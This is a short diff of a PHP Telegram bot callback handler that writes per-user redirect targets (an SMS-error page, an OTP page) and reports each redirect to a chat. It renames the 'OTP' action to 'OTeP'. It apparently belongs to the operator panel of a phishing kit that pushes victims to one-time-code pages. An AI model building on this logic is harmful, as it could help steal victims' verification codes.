@@ -22,7 +22,7 @@ if (isset($update["callback_query"])) {
             "chat_id" => $chat_id,
             "text" => "❌ Redirigido a SMSERROR para $usuario"
         ]));
-    }elseif ($accion === "OTP") {
+    }elseif ($accion === "OTeP") {
         file_put_contents("acciones/{$usuario}.txt", "oppp.php");
         file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
             "chat_id" => $chat_id,
